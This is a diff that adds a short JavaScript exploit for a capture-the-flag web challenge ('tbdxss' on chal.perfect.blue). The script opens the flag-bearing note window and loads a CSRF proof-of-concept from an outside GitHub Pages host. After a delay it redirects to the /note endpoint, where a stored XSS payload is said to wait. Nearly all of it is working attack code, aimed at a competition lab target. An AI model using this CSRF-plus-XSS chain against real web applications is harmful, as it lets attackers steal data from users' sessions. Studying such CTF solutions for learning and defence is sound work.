@@ -1,0 +1,15 @@
+<script type="text/javascript">
+	//first open the note , which contains the flag
+	window.open("https://tbdxss.chal.perfect.blue/note",'flag');
+	;
+
+	//open the csrf poc in another window
+	var csrf = window.open("https://sudistark.github.io/csrf-pb.html")
+
+	//now redirect the current page to the /note endpoint , where we have our xss payload setup
+	setTimeout(() =>
+		window.location.href = "https://tbdxss.chal.perfect.blue/note",
+		6000)
+	
+</script>
+
